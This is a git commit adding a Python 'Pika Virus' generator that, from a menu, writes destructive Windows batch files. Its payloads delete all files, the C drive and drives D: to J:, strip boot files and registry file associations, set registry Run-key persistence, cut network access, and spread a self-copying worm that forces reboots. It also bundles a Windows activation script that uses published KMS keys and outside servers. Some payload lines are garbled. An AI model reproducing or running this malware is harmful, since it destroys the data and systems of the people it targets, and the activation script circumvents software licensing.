e31746871a231b73f80298675eda8607233d0fb2
LegendPikachuYT <79132805+LegendPikachuYT@users.noreply.github.com>
2021-09-06 11:21:49 +0530

    Add files via upload

---
+++ Pikavirus.py
@@ -0,0 +1,295 @@
+#Dont Use This For Illegal Use
+#Made By @LegendPikachu_YT
+import os
+from termcolor import colored
+from pyfiglet import Figlet
+import sys
+import time
+import subprocess
+#code begins
+os.system('clear')
+try:
+	os.chdir('/sdcard/PIKA')
+except:
+	os.mkdir('/sdcard/PIKA')
+def n():
+	print('\n\n')
+def msg():
+	msg=(colored('''  PIKA VIRUS IS STARTING...\n''',color = 'red'))
+	for i in msg:
+        	sys.stdout.write(i)
+        	sys.stdout.flush()
+        	time.sleep(0.02)
+print(colored('''
+
+██████╗░██╗██╗░░██╗░█████╗░
+██╔══██╗██║██║░██╔╝██╔══██╗
+██████╔╝██║█████═╝░███████║
+██╔═══╝░██║██╔═██╗░██╔══██║
+██║░░░░░██║██║░╚██╗██║░░██║
+╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
+
+██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗
+██║░░░██║██║██╔══██╗██║░░░██║██╔════╝
+╚██╗░██╔╝██║██████╔╝██║░░░██║╚█████╗░
+░╚████╔╝░██║██╔══██╗██║░░░██║░╚═══██╗
+░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝
+░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
+''',color = 'blue'))
+print("\n\n")
+msg0=(colored('''+----------------------------------------------+
+| Name:        PIKA VIRUS
+| Author:      @LegendPikachu_YT
++----------------------------------------------+\n''',color = 'red'))
+for i in msg0:
+        sys.stdout.write(i)
+        sys.stdout.flush()
+        time.sleep(0.02)
+n()
+print(colored('           Bat Virus Generator ...',color = 'red'))
+print("\n\n")
+a = colored("ARE YOU SURE YOU WANT TO START (y/n) = ",color = 'green')
+b = input(a).lower()
+if b == "y":
+	print("\n")
+	f = Figlet(font = '5lineoblique')
+	print(colored(f.renderText(' PIKA '),color = 'magenta'))
+	n()
+	print(colored('#NOTE YOUR ACCESS KEY IS = PIKACHU',color = 'red'))
+	c = colored('ENTER YOUR ACCESS KEY HERE = ',color = 'green')
+	n()
+	d = input(c)
+	if d == "PIKACHU":
+		n()
+		msg()
+		os.system('clear')
+		g = Figlet(font = '5lineoblique')
+		print(colored(g.renderText('PIKACHU'),color = 'magenta'))
+		n()
+		print(colored("#NOTE THIS TOOL SHOULD NOTE BE USED FOR ANY ILLEGAL USE \n I AM NOT RESPONSIBLE IF YOU USE THIS FOR ANY ILLEGAL USE \n THIS CAN BE VERY MUCH DEADLIER \n SO DONT DO ANY MISTAKE \n I WILL NOT BE RESPONSIBLE FOR ANYTHING",color = 'red'))
+		print(colored("\n\n>>> Opening The VIRUS Menu >>>",color = 'green'))
+		print("\n\n")
+		print(colored(''' ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ''',color = 'cyan'))
+		print("\n\n")
+		ae = Figlet(font='5lineoblique')
+		print(colored(ae.renderText('MENU'),color = 'green'))
+		print(colored('''
+		[01] Permanent Internet Block \n
+		[02] DELETING FILE\n
+		[03] C DRIVE\n
+		[04] DELETE KEY REGISTER FILES\n
+		[05] DISABLE ANTIVIRUS\n
+		[06] DELETE WHOLE SYSTEM\n
+		[07] SHUT DOWN FOREVER\n
+		[08] 1000 + FOLDER CREATER\n
+		[09] CD/DVD EJECTER\n
+		[10] FORMAT DRIVES\n
+		[11] HARD DRIVE KILLER\n
+		[12] WINDOW 10 ACTIVATER\n
+		[13] MORE INFO ON THESE VIRUS\n
+		[14] EXIT
+		 \n''',color = 'cyan'))
+		print(colored(''' ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ''',color = 'cyan'))
+		yu = colored('ENTER ONE OPTION FROM THE ABOVE LIST = ',color = 'green')
+		e = int(input(yu))
+		if e == int(1):
+			os.chdir('/sdcard/PIKA')
+			with open('internet.bat', "w") as w:
+				w.write('''echo @echo off>c:windowswimn32.bat echo break off>c:windowswimn32.bat echo ipconfig/release_all>c:windowswimn32.bat echo end>c:windowswimn32.batreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED! PAUSE''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(2):
+			os.chdir('/sdcard/PIKA')
+			with open('Delete.bat', "w") as chu:
+				chu.write('''Del *.*''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(3):
+			os.chdir('/sdcard/PIKA')
+			with open('cdrive.bat', "w") as cdu:
+				cdu.write('''@Echo off Del C:\ *.* |y''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(4):
+			os.chdir('/sdcard/PIKA')
+			with open('key.bat', "w") as ceu:
+				ceu.write('''@ECHO OFF START reg delete HKCR/.exe START reg delete HKCR/.dll START reg delete HKCR/* :MESSAGE ECHO Your PC has been crashed.Your Dad. GOTO MESSAGE''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(5):
+			subprocess.call('cp -p antivirus.bat /sdcard/PIKA',shell = True)
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(6):
+			os.chdir('/sdcard/PIKA')
+			with open('deleter.bat', "w") as chut:
+				chut.write('Del *.*')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(7):
+			os.chdir('/sdcard/PIKA')
+			with open('SHUTDOWN.bat', "w") as susu:
+				susu.write('''@echo off
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows
+\win.ini
+del c:\windows\win.ini
+''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(8):
+			os.chdir('/sdcard/PIKA')
+			with open('foldercreate.bat', "w") as fuk:
+				fuk.write('''@echo off
+:top
+md %random%
+''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(9):
+			os.chdir('/sdcard/PIKA')
+			with open('cdejecter.bat', "w") as ful:
+				ful.write('''Set oWMP = CreateObject(“WMPlayer.OCX.7″)
+Set colCDROMs = oWMP.cdromCollection
+do
+if colCDROMs.Count >= 1 then
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+End If
+wscript.sleep 5000
+loop
+''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(10):
+			os.chdir('/sdcard/PIKA')
+			with open('formatdrive.bat', "w") as fulz:
+				fulz.write('''@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(11):
+			os.chdir('/sdcard/PIKA')
+			with open('killer.bat', "w") as hue:
+				hue.write('''@Echo off
+color 4
+title 4
+title RAMNAAMSATYA
+start
+start
+start
+start calc
+copy %0 %Systemroot%\Greatgame > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
+/d %systemroot%\Greatgame.bat /f > nul
+copy %0 *.bat > nul
+Attrib +r +h Greatgame.bat
+Attrib +r +h
+RUNDLL32 USER32.DLL.SwapMouseButton
+start calc
+cls
+tskill msnmsgr
+tskill LimeWire
+tskill iexplore
+tskill NMain
+start
+cls
+cd %userprofile%\desktop
+copy Greatgame.bat RAMNAAMSATYA.bat
+copy Greatgame.bat RAMNAAMSATYA.jpg
+copy Greatgame.bat RAMNAAMSATYA.txt
+copy Greatgame.bat RAMNAAMSATYA.exe
+copy Greatgame.bat RAMNAAMSATYA.mov
+copy Greatgame.bat FixVirus.bat
+cd %userprofile%My Documents
+copy Greatgame.bat RAMNAAMSATYA.bat
+copy Greatgame.bat RAMNAAMSATYA.jpg
+copy Greatgame.bat RAMNAAMSATYA.txt
+copy Greatgame.bat RAMNAAMSATYA.exe
+copy Greatgame.bat RAMNAAMSATYA.mov
+copy Greatgame.bat FixVirus.bat
+start
+start calc
+cls
+msg * RAMNAAMSATYA
+msg * RAMNAAMSATYA
+shutdown -r -t 10 -c "VIRUS DETECTED"
+start
+start
+time 12:00
+:RAMNAAMSATYA
+cd %usernameprofile%\desktop
+copy Greatgame.bat %random%.bat
+goto RAMNAAMSATYA
+''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(12):
+			os.chdir('/sdcard/PIKA')
+			with open('windowkey.bat', "w") as fulo:
+				fulo.write('''@echo off  
+ title Activate Windows 10 ALL versions for FREE indianhacking.in!&cls&echo ============================================================================&echo #Project: Activating Microsoft software products for FREE without software&echo ============================================================================&echo.&echo #Supported products:&echo - Windows 10 Home&echo - Windows 10 Home N&echo - Windows 10 Home Single Language&echo - Windows 10 Home Country Specific&echo - Windows 10 Professional&echo - Windows 10 Professional N&echo - Windows 10 Education N&echo - Windows 10 Education N&echo - Windows 10 Enterprise&echo - Windows 10 Enterprise N&echo - Windows 10 Enterprise LTSB&echo - Windows 10 Enterprise LTSB N&echo.&echo.&echo ============================================================================&echo Activating your Windows...&cscript //nologo slmgr.vbs /upk >nul&cscript //nologo slmgr.vbs /cpky >nul&wmic os | findstr /I "enterprise" >nul  
+ if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 >nul&cscript //nologo slmgr.vbs /ipk DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 >nul&cscript //nologo slmgr.vbs /ipk WNMTR-4C88C-JK8YV-HQ7T2-76DF9 >nul&cscript //nologo slmgr.vbs /ipk 2F77B-TNFGY-69QQF-B8YKP-D69TJ >nul&cscript //nologo slmgr.vbs /ipk DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ >nul&cscript //nologo slmgr.vbs /ipk QFFDN-GRT3P-VKWWX-X7T3R-8B639 >nul) else wmic os | findstr /I "10 pro" >nul  
+ if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX >nul&cscript //nologo slmgr.vbs /ipk MH37W-N47XK-V7XM9-C7227-GCQG9 >nul) else wmic os | findstr /I "home" >nul  
+ if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 >nul&cscript //nologo slmgr.vbs /ipk 3KHY7-WNT83-DGQKR-F7HPR-844BM >nul&cscript //nologo slmgr.vbs /ipk 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH >nul&cscript //nologo slmgr.vbs /ipk PVMJN-6DFY6-9CCP6-7BKTT-D3WVR >nul) else (echo.)  
+ set i=1  
+ :server  
+ if %i%==1 set KMS_Sev=kms7.MSGuides.com  
+ if %i%==2 set KMS_Sev=kms8.MSGuides.com  
+ if %i%==3 set KMS_Sev=kms9.MSGuides.com  
+ if %i%==4 goto notsupported  
+ cscript //nologo slmgr.vbs /skms %KMS_Sev% >nul&echo ============================================================================&echo.&echo.  
+ cscript //nologo slmgr.vbs /ato | find /i "successfully" && (echo.&echo ============================================================================&echo.&echo #My official blog: MSGuides.com&echo.&echo #How it works: bit.ly/kms-server&echo.&echo #Please feel free to contact me at msguides.com@gmail.com if you have any questions or concerns.&echo.&echo #Please consider supporting this project: donate.msguides.com&echo #Your support is helping me keep my servers running everyday!&echo.&echo ============================================================================&choice /n /c YN /m "Would you like to visit my blog [Y,N]?" & if errorlevel 2 exit) || (echo The connection to my KMS server failed! Trying to connect to another one... & echo Please wait... & echo. & echo. & set /a i+=1 & goto server)  
+ explorer "http://MSGuides.com"&goto halt  
+ :notsupported  
+ echo ============================================================================&echo.&echo Sorry! Your version is not supported.&echo.  
+ :halt  
+ pause >nul''')
+			n()
+			print(colored("[+] SUCCESSFULLY CREATED VIRUS IN FOLDER = PIKA",color = 'red'))
+		if e == int(13):
+			os.system('clear')
+			print(colored('  ABOUT THESE VIRUS! \n \n THESE VIRUS ONLY WORKS ON \n\n LAPTOP ETC. USERS NOT FOR MOBILE USER \n\n\n.HERE ARE DETAILS. \n\n',color = 'red'))
+			print(colored('''
+			PERMANENT INTERNET BLOCK = BLOCKS INTERNET PERMANENTLY!\n
+			DELETING FILE = DELETES ALL FILES\n
+			C DRIVE DELETE = DELETE WHOLE C DRIVE\n
+			DELETE KEY REGISTRATION = DELETE KEY REGISTRATION FILES! \n
+			DISABLE ANTIVIRUS = DISABLES ANTIVIRUS NOT 100% SURE\n
+			DELETE WHOLE SYSTEM = DELETE WHOLE SYSTEM\n
+			SHUT DOWN = THIS WILL SHUTDOWN THE PC AND WILL NEVER OPEN\n
+			FOLDER CREATER = CREATES MANY FOLDER AND FILLS SPACE
+			CD/DVD EJECTER = EJECT DVD/CD CONTINIOUSLY\n
+			FORMAT DRIVE = FORMATS DRIVE\n
+			HARD DRIVE KILLER = KILLS HARD DRIVE\n
+			WINDOW ACTIVATER = ACTIVATES WINDOW 10 WITHOUT KEY''',color = 'cyan'))
+		if e == int(14):
+			print(colored('EXITING...',color = 'yellow'))
+			exit
+	else:
+		n()
+		print(colored('   YOUR ACCESS KEY IS NOT VALID!',color = 'red'))
+elif b == "n":
+	n()
+	print(colored('	EXITING THE PIKA VIRUS...!',color = 'yellow'))
+	exit
+else:
+	n()
+	print(colored('	THIS IS NOT A VALID OPTION !',color = 'red'))
+	exit
